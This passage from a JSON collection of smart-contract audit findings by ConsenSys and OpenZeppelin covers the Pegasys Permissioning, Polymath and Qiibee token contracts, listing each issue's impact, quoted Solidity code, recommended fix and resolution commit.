      "content": "#### Resolution\n\n\n\nThis is fixed in [PegaSysEng/[emailprotected]`acf5a22`](https://github.com/PegaSysEng/permissioning-smart-contracts/commit/acf5a224e6b07240bca35a7291f57bfd28119983) by pinning to Solidity 0.5.9 everywhere except the `Ingress` contract. Because the `Ingress` contract is hardcoded into the genesis block, it cant be easily changed. Non-critical issues like this one wont be addressed in that contract.\n\n\n#### Description\n\n\nA number of files use a floating pragma as follows:\n\n\n\n```\npragma solidity >=0.4.22 <0.6.0;\n\n```\nIts better to use a specific Solidity compiler version (preferably a current version). This removes any confusion about which compiler was used when the contract is deployed, and it makes sure the code is never subjected to older compiler bugs.\n\n\nIts still a good idea to upgrade the compiler version in the future as compiler bugs are fixed, but this way you must explicitly choose the new compiler version in your code when you do so.\n\n\n#### Recommendation\n\n\nBased on the Truffle configuration, the code is currently compiled with Solidity 0.5.9. Consider changing the existing `pragma`s to the following:\n\n\n\n```\npragma solidity 0.5.9;\n\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Pegasys Permissioning",
      "source_link": "https://consensys.net/diligence/audits/2019/08/pegasys-permissioning/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Steve Marx",
        "John Mardlin",
        " Dean Pierce"
      ]
    },
    {
      "id": "14007",
      "title": "Ingress should use a set Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThis is fixed in [PegaSysEng/[emailprotected]`2978bd0`](https://github.com/PegaSysEng/permissioning-smart-contracts/commit/2978bd0084564121304e95eaf3d44871cedc8ecf) and [PegaSysEng/[emailprotected]`f973035`](https://github.com/PegaSysEng/permissioning-smart-contracts/commit/f9730356adf52ff31b654f0ca1d9427571a1ce4f).\n\n\n#### Description\n\n\nThe `AdminList`, `AccountRulesList`, and `NodeRulesList` contracts have been recently rewritten to use a set. `Ingress` has the semantics of a set but has not been written the same way.\n\n\nThis leads to some inefficiencies. In particular, `Ingress.removeContract` is an O(n) operation:\n\n\n**code/contracts/Ingress.sol:L68-L74**\n\n\n\n```\nfor (uint i = 0; i < contractKeys.length; i++) {\n    // Delete the key from the array + mapping if it is present\n    if (contractKeys[i] == name) {\n        delete registry[contractKeys[i]];\n        contractKeys[i] = contractKeys[contractKeys.length - 1];\n        delete contractKeys[contractKeys.length - 1];\n        contractKeys.length--;\n\n```\n#### Recommendation\n\n\nUse the same set implementation for `Ingress`: an array of `ContractDetails` and a mapping of names to indexes in that array.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Pegasys Permissioning",
      "source_link": "https://consensys.net/diligence/audits/2019/08/pegasys-permissioning/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Steve Marx",
        "John Mardlin",
        " Dean Pierce"
      ]
    },
    {
      "id": "14006",
      "title": "Use specific contract types instead of address where possible Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThis is fixed in [PegaSysEng/[emailprotected]`05d33ae`](https://github.com/PegaSysEng/permissioning-smart-contracts/commit/05d33ae376f00fcc768c333dc7a2812283cf5004) and [PegaSysEng/[emailprotected]`2728bac`](https://github.com/PegaSysEng/permissioning-smart-contracts/commit/2728bacb9c2f2bb8709bf17e6796bfd10da38321).\n\n\n#### Description\n\n\nFor clarity and to get more out of the Solidity type checker, its generally preferred to use a specific contract type for variables rather than the generic `address`.\n\n\n#### Examples\n\n\n`AccountRules.ingressContractAddress` could instead be `AccountRules.ingressContract` and use the type `IngressContract`:\n\n\n**code/contracts/AccountRules.sol:L16**\n\n\n\n```\naddress private ingressContractAddress;\n\n```\n**code/contracts/AccountRules.sol:L24**\n\n\n\n```\nAccountIngress ingressContract = AccountIngress(ingressContractAddress);\n\n```\n**code/contracts/AccountRules.sol:L32**\n\n\n\n```\nconstructor (address ingressAddress) public {\n\n```\nThis same pattern is found in `NodeRules`:\n\n\n**code/contracts/NodeRules.sol:L32**\n\n\n\n```\naddress private nodeIngressContractAddress;\n\n```\n#### Recommendation\n\n\nWhere possible, use a specific contract type rather than `address`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Pegasys Permissioning",
      "source_link": "https://consensys.net/diligence/audits/2019/08/pegasys-permissioning/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Steve Marx",
        "John Mardlin",
        " Dean Pierce"
      ]
    },
    {
      "id": "14005",
      "title": "Ingress.setContractAddress() can cause duplicate entries in contractKeys Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nThis is fixed in [PegaSysEng/[emailprotected]`faff726`](https://github.com/PegaSysEng/permissioning-smart-contracts/commit/faff726bd44f3bf74ca3a294d47e3b0cd8e9b27f).\n\n\n#### Description\n\n\n`setContractAddress()` checks `ContractDetails` existence by inspecting `contractAddress`. A `contractAddress` of `0` means that the contract does not already exist, and its name must be added to `contractKeys`:\n\n\n**code/contracts/Ingress.sol:L39-L62**\n\n\n\n```\nfunction setContractAddress(bytes32 name, address addr) public returns (bool) {\n    require(name > 0x0000000000000000000000000000000000000000000000000000000000000000, \"Contract name must not be empty.\");\n    require(isAuthorized(msg.sender), \"Not authorized to update contract registry.\");\n\n    ContractDetails memory info = registry[name];\n    // create info if it doesn't exist in the registry\n    if (info.contractAddress == address(0)) {\n        info = ContractDetails({\n            owner: msg.sender,\n            contractAddress: addr\n        });\n\n        // Update registry indexing\n        contractKeys.push(name);\n   } else {\n        info.contractAddress = addr;\n   }\n    // update record in the registry\n    registry[name] = info;\n\n    emit RegistryUpdated(addr,name);\n\n    return true;\n}\n\n```\nIf, however, a contract is actually added with the address `0`, which is currently allowed in the code, then the contract does already exists, and adding the name to `contractKeys` again will result in a duplicate.\n\n\n#### Mitigation\n\n\nAn admin can call `removeContract` repeatedly with the same name to remove multiple duplicate entries.\n\n\n#### Recommendation\n\n\nEither disallow a contract address of `0` or check for existence via the `owner` field instead (which can never be `0`).",
      "summary": "\nThis bug report is about an issue with the `setContractAddress()` function in the Ingress.sol file. It occurs when a contract is added with the address 0, which is currently allowed in the code. This results in the contract name being added to the `contractKeys` array again, resulting in a duplicate entry. The resolution is that this is fixed in PegaSysEng/[emailprotected]`faff726`. To mitigate this issue, an admin can call `removeContract` repeatedly with the same name to remove multiple duplicate entries. The recommendation is to either disallow a contract address of 0 or check for existence via the `owner` field instead (which can never be 0).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Pegasys Permissioning",
      "source_link": "https://consensys.net/diligence/audits/2019/08/pegasys-permissioning/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Steve Marx",
        "John Mardlin",
        " Dean Pierce"
      ]
    },
    {
      "id": "14004",
      "title": "readOnlyMode is ineffective and may result in a false sense of security Addressed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nThis was addressed in [PegaSysEng/[emailprotected]`ed2d4a2`](https://github.com/PegaSysEng/permissioning-smart-contracts/commit/ed2d4a2c30931f59c84afb319570060e3b0c1f6b) by adding comments to clarify that `readOnlyMode` is meant simply to prevent accidental changes during upgrades.\n\n\n#### Description\n\n\n`AccountRules` and `NodeRules` can both enter and exit a mode of operation called `readOnlyMode`.\n\n\nThe only effect of `readOnlyMode` is to prevent admins (who are the only users able to change rules) from changing rules.\n\n\nThose same admins can disable `readOnlyMode`, so this mode will not prevent a determined actor from doing something they want to do.\n\n\n#### Recommendation\n\n\nEither `readOnlyMode` should be removed to prevent it from providing a false sense of security, or the authorization required to toggle `readOnlyMode` should be separated from the authorization required to change rules.",
      "summary": "\nThis bug report is about the `AccountRules` and `NodeRules` of the permissioning-smart-contracts which can enter and exit a mode called `readOnlyMode`. This mode was added to prevent admins, who are the only users able to change rules, from changing rules. However, the same admins can disable `readOnlyMode` which makes this mode ineffective. In order to address this bug, a resolution was added to clarify that `readOnlyMode` is meant to prevent accidental changes during upgrades. The recommendation is that either `readOnlyMode` should be removed or the authorization required to toggle `readOnlyMode` should be separated from the authorization required to change rules.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Pegasys Permissioning",
      "source_link": "https://consensys.net/diligence/audits/2019/08/pegasys-permissioning/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Steve Marx",
        "John Mardlin",
        " Dean Pierce"
      ]
    },
    {
      "id": "11935",
      "title": "Token distribution address can benull",
      "impact": "LOW",
      "content": "In the [`PolyToken`](https://github.com/PolymathNetwork/polymath-token-distribution/blob/672fabe081e8f90ea025252d92c2eb247d60010e/contracts/PolyToken.sol) constructor, the total supply of the token is granted to the `_polyDistributionContractAddress`, which as its name suggests, it is expected to be the [`PolyDistribution`](https://github.com/PolymathNetwork/polymath-token-distribution/blob/672fabe081e8f90ea025252d92c2eb247d60010e/contracts/PolyDistribution.sol) contracts address.  \n\nHowever, this parameter is never inspected nor validated, allowing it to be the `0x0` address, which would make the contract unusable. This goes against the principle of *fail early and loudly*.  \n\nConsider prohibiting the null address as a parameter of the `PolyToken` constructor.  \n\n***Update**: Fixed in commit [`0b47ae4`](https://github.com/PolymathNetwork/polymath-token-distribution/commit/0b47ae467f95a02c6b71421e5816b5d50b698158#diff-543a247b6e898afd56d06d087727abcaR32).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Polymath Audit",
      "source_link": "https://blog.openzeppelin.com/polymath-audit-be55e9936aba/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11934",
      "title": "No Transfer event for mintedtokens",
      "impact": "LOW",
      "content": "It is recommended, [in the ERC20 spec](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md#transfer), to emit a `Transfer` event with the source (`_from`) set to `0x0` when minting new tokens. This enhances user experience by allowing applications such as [Etherscan](https://etherscan.io/) to learn of the new token holders. In this case this is only relevant for the constructor, where the initial balance is assigned to the distribution contract. Nonetheless, consider emitting the corresponding event: `Transfer(0x0, msg.sender, _initialAmount)`.  \n\n***Update**: Fixed in commit [`0b47ae4`](https://github.com/PolymathNetwork/polymath-token-distribution/commit/0b47ae467f95a02c6b71421e5816b5d50b698158#diff-543a247b6e898afd56d06d087727abcaR34).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Polymath Audit",
      "source_link": "https://blog.openzeppelin.com/polymath-audit-be55e9936aba/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11933",
      "title": "Install OpenZeppelin viaNPM",
      "impact": "LOW",
      "content": "The [`SafeMath`](https://github.com/PolymathNetwork/polymath-token-distribution/blob/672fabe081e8f90ea025252d92c2eb247d60010e/contracts/SafeMath.sol) and [`Ownable`](https://github.com/PolymathNetwork/polymath-token-distribution/blob/672fabe081e8f90ea025252d92c2eb247d60010e/contracts/Ownable.sol) contacts were copied from the OpenZeppelin repository, and [`PolyToken`](https://github.com/PolymathNetwork/polymath-token-distribution/blob/672fabe081e8f90ea025252d92c2eb247d60010e/contracts/PolyToken.sol) is a copy of the [`StandardToken`](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/token/ERC20/StandardToken.sol) contract.  \n\nConsider making the `PolyToken` contract inherit from `StandardToken` to minimize its logic, and following the [recommended way](https://github.com/OpenZeppelin/zeppelin-solidity#getting-started) to use OpenZeppelin contracts, which is via the [zeppelin-solidity NPM package](https://www.npmjs.com/package/zeppelin-solidity), allowing for any bugfixes to be easily integrated into the codebase.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Polymath Audit",
      "source_link": "https://blog.openzeppelin.com/polymath-audit-be55e9936aba/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11932",
      "title": "Incomplete ERC20 Interface",
      "impact": "LOW",
      "content": "The [`IERC20`](https://github.com/PolymathNetwork/polymath-token-distribution/blob/672fabe081e8f90ea025252d92c2eb247d60010e/contracts/interfaces/IERC20.sol) contract defines the basic interface of a standard token to be used by the [`PolyToken`](https://github.com/PolymathNetwork/polymath-token-distribution/blob/672fabe081e8f90ea025252d92c2eb247d60010e/contracts/PolyToken.sol) contract. However, this contract doesnt follow the [ERC20 standard](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md) which requires for the [`totalSupply`](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md#totalsupply) function to be defined in its public interface.  \n\nWe recommend dropping this contract in favor of the [`ERC20`](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/token/ERC20/ERC20.sol) contract from the OpenZeppelin library. If not, consider adding the missing function to the contract to comply with the standard and making this contract an [interface](https://solidity.readthedocs.io/en/develop/contracts.html#interfaces) as its name and usage suggests.  \n\n***Update**: Contract is now an interface [`0b47ae4`](https://github.com/PolymathNetwork/polymath-token-distribution/commit/0b47ae467f95a02c6b71421e5816b5d50b698158#diff-413505d806d853f99c61732dcacec638R7).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Polymath Audit",
      "source_link": "https://blog.openzeppelin.com/polymath-audit-be55e9936aba/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11931",
      "title": "Possible overflow in loop indexvariable",
      "impact": "MEDIUM",
      "content": "The [`airdropTokens`](https://github.com/PolymathNetwork/polymath-token-distribution/blob/672fabe081e8f90ea025252d92c2eb247d60010e/contracts/PolyDistribution.sol#L117) function of the [`PolyDistribution`](https://github.com/PolymathNetwork/polymath-token-distribution/blob/672fabe081e8f90ea025252d92c2eb247d60010e/contracts/PolyDistribution.sol) contract takes an array of addresses as a parameter in order to airdrop tokens to each of them. To do so, a `for` [loop](https://github.com/PolymathNetwork/polymath-token-distribution/blob/672fabe081e8f90ea025252d92c2eb247d60010e/contracts/PolyDistribution.sol#L120) is used, with an index variable of type `uint8`. This will result in an overflow for arrays which have more than 255 addresses. The loop will indefinitely iterate over the first 255 addresses, eventually failing with an out of gas error, wasting gas.  \n\nConsider using a `uint256` variable for the index.  \n\n***Update**: Fixed in commit [`0b47ae4`](https://github.com/PolymathNetwork/polymath-token-distribution/commit/0b47ae467f95a02c6b71421e5816b5d50b698158#diff-894d6a69e0d58851828ece9513b36f5fR119).*",
      "summary": "\nThis bug report is about the `airdropTokens` function of the `PolyDistribution` contract. This function takes an array of addresses as an argument and airdrops tokens to each of the addresses. To do this, a `for` loop is used with an index variable of type `uint8`. This will cause an overflow for arrays which have more than 255 addresses, resulting in an out of gas error and wasting gas. \n\nThe suggested solution is to use a `uint256` variable for the index. This has been fixed in commit `0b47ae4`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Polymath Audit",
      "source_link": "https://blog.openzeppelin.com/polymath-audit-be55e9936aba/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11952",
      "title": "Missing full sanity checks on adding accredited investors",
      "impact": "LOW",
      "content": "It is possible to `addAccreditedInvestor` with `minInvest` being greater than `maxCumulativeInvest`. Although this configuration will be recorded properly, it will throw an exception on [line 92](https://github.com/qiibee/qb-contracts/blob/26d5963491c26a56938c723a342b666d3b478ea7/contracts/QiibeePresale.sol#L92) of the `buyTokens` function, therefore preventing the investor to take a part into the sale.\n\n\nWe recommend adding an extra precondition `require( minInvest &lt;= maxCumulativeInvest)` in [line 119](https://github.com/qiibee/qb-contracts/blob/26d5963491c26a56938c723a342b666d3b478ea7/contracts/QiibeePresale.sol#L119) so any potential errors are detected as early as possible.\n\n\n***Update:** Fixed in [this](https://github.com/qiibee/qb-contracts/commit/25efdbf5bc29de12a724450c540218f6c8e59129) commit.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee TokenAudit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11951",
      "title": "Validate MigrationAgent setting",
      "impact": "LOW",
      "content": "The [`setMigrationAgent`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L100) function from [`QiibeeToken`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol) does not check if the `agent.qbxSourceToken` matches the address of the contract from which the function is executed. Linking to a `MigrationAgent` that was configured to work with a different token may corrupt the migration process.\n\n\nWe recommend checking the precondition `require(_agent.qbxSourceToken == address(this))` in [line 102](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L102) to avoid being in an inconsistent state.\n\n\n***Update:** Fixed in [this](https://github.com/qiibee/qb-contracts/commit/25efdbf5bc29de12a724450c540218f6c8e59129) commit.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee TokenAudit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11950",
      "title": "Vesting logic implemented directly in the tokencontract",
      "impact": "LOW",
      "content": "The vesting logic is currently implemented in the `QiibeeToken` in the form of a base `VestedToken` contract. These features are going to be used by a limited number of buyers and for a restricted amount of time only. Having complex logic included directly in the token contract may not only cause compatibility issues with blockchain explorers and exchanges, but it may also increase the potential attack surface.\n\n\nWe would suggest extracting the vesting logic into a separate contract as implemented in the OpenZeppelin [pull request](https://github.com/OpenZeppelin/zeppelin-solidity/issues/274).\n\n\n***Update:** The Qiibee team explained, that because of legal matters, they prefer to keep both functionalities within a single contract that controls token issuance.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee TokenAudit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11949",
      "title": "Constant names incompatible with the ERC20standard",
      "impact": "MEDIUM",
      "content": "[`QiibeeToken`](https://github.com/qiibee/qb-contracts/blob/26d5963491c26a56938c723a342b666d3b478ea7/contracts/QiibeeToken.sol) declares the obligatory [`ERC20`](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md) standard parameters as uppercase constants: [`SYMBOL`](https://github.com/qiibee/qb-contracts/blob/26d5963491c26a56938c723a342b666d3b478ea7/contracts/QiibeeToken.sol#L19), [`NAME`](https://github.com/qiibee/qb-contracts/blob/26d5963491c26a56938c723a342b666d3b478ea7/contracts/QiibeeToken.sol#L21), [`DECIMALS`](https://github.com/qiibee/qb-contracts/blob/26d5963491c26a56938c723a342b666d3b478ea7/contracts/QiibeeToken.sol#L23). This conflicts with the official specification that requires the names to be lowercase: `symbol`, `name`, `decimals`.\n\n\nConsider renaming constants to lowercase, so they are compliant with the official [`ERC20`](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md) standard.\n\n\n***Update:** Fixed in [this](https://github.com/qiibee/qb-contracts/commit/25efdbf5bc29de12a724450c540218f6c8e59129) commit.*",
      "summary": "\nQiibeeToken is a contract that follows the ERC20 standard, which is a standard for tokens on the Ethereum blockchain. The QiibeeToken contract declares the necessary parameters for the ERC20 standard as uppercase constants, however, the official specification requires the names to be in lowercase. This bug report suggests that the constants should be renamed to lowercase, so they are compliant with the official ERC20 standard. The bug has since been fixed in a commit, making the QiibeeToken contract compliant with the ERC20 standard.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee TokenAudit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11948",
      "title": "Unchecked math operations",
      "impact": "MEDIUM",
      "content": "There are three unchecked math operations inside the migration function in lines [114](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L114)[116](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L116). Its always better to be safe and perform operations with correctness assertions.\n\n\nConsider rigorously checking for under and overflows for all of the arithmetic operations. We recommend using the [`SafeMath`](https://github.com/OpenSTFoundation/SimpleTokenSale/blob/1a1e863441ba0149d7585203f5dbc6e800af00cf/contracts/SafeMath.sol) library from OpenZeppelin.\n\n\n***Update:** Fixed in [this](https://github.com/qiibee/qb-contracts/commit/25efdbf5bc29de12a724450c540218f6c8e59129) commit.*",
      "summary": "\nThis bug report is about an issue found in the migration function of the QiibeeToken.sol file, located on lines 114-116. The issue is that there are three unchecked math operations in the function, which could lead to incorrect results, or even under/overflows. To fix this issue, the OpenZeppelin SafeMath library should be used, which provides a set of math operations that are rigorously checked for under/overflows. The bug has now been fixed in the 25efdbf5bc29de12a724450c540218f6c8e59129 commit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee TokenAudit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11947",
      "title": "Token minting is not synchronized with MigrationAgent",
      "impact": "HIGH",
      "content": "Token minting leads to an inconsistent state as the `MigrationAgent` [tokenSupply](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol#L21) is never increased after being set in the constructor. The discrepancy between the [`QiibeeToken`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol) and the [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol) states, breaks the [`safetyInvariantCheck`](http://safetyInvariantCheck) and corrupts the migration process.\n\n\nWe suggest enforcing that the token has finalized the minitingby adding the check `require(_qbxSourceToken.mintingFinished)` in [line 21](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol#L21) of the [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol). If the team wants to continue the minting after the migration is deployed we recommend increasing the `tokenSupply` by the amount of newly created tokens.\n\n\n***Update:** Fixed in [this](https://github.com/qiibee/qb-contracts/commit/25efdbf5bc29de12a724450c540218f6c8e59129) commit by tracking [`newTokens`](https://github.com/qiibee/qb-contracts/blob/25efdbf5bc29de12a724450c540218f6c8e59129/contracts/QiibeeToken.sol#L139) and updating the [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/25efdbf5bc29de12a724450c540218f6c8e59129/contracts/MigrationAgent.sol) state in the [`updateSupply`](https://github.com/qiibee/qb-contracts/blob/25efdbf5bc29de12a724450c540218f6c8e59129/contracts/MigrationAgent.sol#L57) function.*",
      "summary": "\nThis bug report is about an inconsistency between the token supply in the QiibeeToken and MigrationAgent contracts. The issue is that the tokenSupply of the MigrationAgent is never increased after being set in the constructor, leading to a discrepancy between the two contracts. This breaks the safetyInvariantCheck and corrupts the migration process.\n\nTo fix this issue, a check was added to the MigrationAgent contract that the token has finalized minting. Additionally, if the team wants to continue minting after the migration is deployed, the tokenSupply must be increased by the amount of newly created tokens. This was fixed in a commit by tracking newTokens and updating the MigrationAgent state in the updateSupply function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee TokenAudit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11946",
      "title": "Migration bypasses vesting restrictions",
      "impact": "HIGH",
      "content": "All of the users are allowed to [`migrate`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L109) their tokens to a new contract regardless of whether their assets are fully transferable or locked in a vesting scheme. Moreover, once they migrate the tokens any vesting restrictions are removed.\n\n\nWe recommend only allowing `transferableTokens` to be available for migrations. An alternative solution is to implement a new `migateVestedTokens` function that will copy the vesting configuration to the migration target contract.\n\n\n***Update:** Fixed in [this](https://github.com/qiibee/qb-contracts/commit/25efdbf5bc29de12a724450c540218f6c8e59129) commit by [checking](https://github.com/qiibee/qb-contracts/blob/25efdbf5bc29de12a724450c540218f6c8e59129/contracts/QiibeeToken.sol#L120) if the amount of tokens is within the `transferableTokens` limit at the moment of migration.*",
      "summary": "\nThis bug report is about the Qiibee Token contract, which allows all users to migrate their tokens to a new contract regardless of whether their assets are fully transferable or locked in a vesting scheme. This can cause issues since any vesting restrictions are removed during the migration process. \n\nThe recommended solution is to only allow transferable tokens to be available for migrations. An alternative solution is to create a new migrateVestedTokens function that will copy the vesting configuration to the migration target contract. \n\nThe bug has been fixed in a commit by checking if the amount of tokens is within the transferableTokens limit at the moment of migration.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee TokenAudit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11945",
      "title": "Tokens burning breaks MigrationAgent contract",
      "impact": "HIGH",
      "content": "Tokens burning after the deployment of the [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol) creates a discrepancy between `tokenSupply` defined in the token and the migration contract, which will irreversibly break the [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol). Once the `MigrationAgent` contract is deployed, it defines [`tokenSupply`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol#L21) to match the current state of `qbxSourceToken`. However, when the supply of the source token decreases after burning, the [`tokenSupply`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol#L21) variable is not updated causing invariants checks to fail. [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol) may be corrupted by any token holder as the access to the [`burn`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L134) function is not restricted.\n\n\nConsider restricting the access to the [`burn`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L134) function solely to the [`QiibeeToken`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol) owner. If this solution cannot be implemented, we suggest updating [`tokenSupply`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol#L21) variable of after every [`burn`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L134) operation as an alternative.\n\n\n***Update**: Fixed in [this](https://github.com/qiibee/qb-contracts/commit/25efdbf5bc29de12a724450c540218f6c8e59129) commit by both restricting the access to the [`burn`](https://github.com/qiibee/qb-contracts/blob/25efdbf5bc29de12a724450c540218f6c8e59129/contracts/QiibeeToken.sol#L174) function and counting the `burntTokens`, so the [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/25efdbf5bc29de12a724450c540218f6c8e59129/contracts/MigrationAgent.sol) can [`updateSupply`](https://github.com/qiibee/qb-contracts/blob/25efdbf5bc29de12a724450c540218f6c8e59129/contracts/MigrationAgent.sol#L57).*",
